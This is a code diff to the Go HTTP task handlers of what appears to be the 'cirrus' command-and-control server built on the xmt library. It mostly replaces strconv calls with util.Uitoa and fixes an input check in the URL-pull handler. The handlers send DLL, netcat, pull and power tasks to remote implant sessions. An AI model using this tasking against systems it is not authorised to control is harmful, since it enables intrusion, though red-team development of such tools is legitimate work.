@@ -19,11 +19,11 @@ package cirrus
 import (
 	"context"
 	"net/http"
-	"strconv"
 	"strings"
 
 	"github.com/PurpleSec/routex"
 	"github.com/iDigitalFlame/xmt/c2/task"
+	"github.com/iDigitalFlame/xmt/util"
 )
 
 func (s *sessionManager) httpTaskDLL(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskDLL) {
@@ -115,7 +115,7 @@ func (s *sessionManager) httpTaskPower(_ context.Context, w http.ResponseWriter,
 		return
 	}
 	if t.Seconds > 0 {
-		s.watchJob(x, j, "power "+strings.ToLower(t.Action)+" "+strconv.FormatUint(uint64(t.Seconds), 10))
+		s.watchJob(x, j, "power "+strings.ToLower(t.Action)+" "+util.Uitoa(uint64(t.Seconds)))
 	} else {
 		s.watchJob(x, j, "power "+strings.ToLower(t.Action))
 	}
@@ -233,7 +233,7 @@ func (s *sessionManager) httpTaskNetcat(_ context.Context, w http.ResponseWriter
 		writeError(http.StatusBadRequest, "tasking failed: "+err.Error(), w, r)
 		return
 	}
-	s.watchJob(x, j, "netcat "+t.Host+"/"+t.Protocol+" "+strconv.FormatUint(uint64(len(t.Data)), 10)+"b"+hashSum(t.Data))
+	s.watchJob(x, j, "netcat "+t.Host+"/"+t.Protocol+" "+util.Uitoa(uint64(len(t.Data)))+"b"+hashSum(t.Data))
 	w.WriteHeader(http.StatusCreated)
 	j.JSON(w)
 }
@@ -292,12 +292,8 @@ func (s *sessionManager) httpTaskPull(_ context.Context, w http.ResponseWriter, 
 		p = c.StringDefault("path", "")
 		a = c.StringDefault("agent", "")
 	)
-	if len(p) == 0 {
+	if len(u) == 0 {
 		writeError(http.StatusBadRequest, `invalid or empty "url" value`, w, r)
-		return
-	}
-	if len(p) == 0 {
-		writeError(http.StatusBadRequest, `invalid or empty "path" value`, w, r)
 		return
 	}
 	x := s.session(r.Values.StringDefault("session", ""))
@@ -624,8 +620,8 @@ func (s *sessionManager) httpTaskWorkHours(_ context.Context, w http.ResponseWri
 		return
 	}
 	s.watchJob(x, j,
-		"workhours "+t.Days+" "+strconv.FormatUint(uint64(t.StartHour), 10)+":"+strconv.FormatUint(uint64(t.StartMin), 10)+" - "+
-			strconv.FormatUint(uint64(t.EndHour), 10)+":"+strconv.FormatUint(uint64(t.EndMin), 10),
+		"workhours "+t.Days+" "+util.Uitoa(uint64(t.StartHour))+":"+util.Uitoa(uint64(t.StartMin))+" - "+
+			util.Uitoa(uint64(t.EndHour))+":"+util.Uitoa(uint64(t.EndMin)),
 	)
 	w.WriteHeader(http.StatusCreated)
 	j.JSON(w)
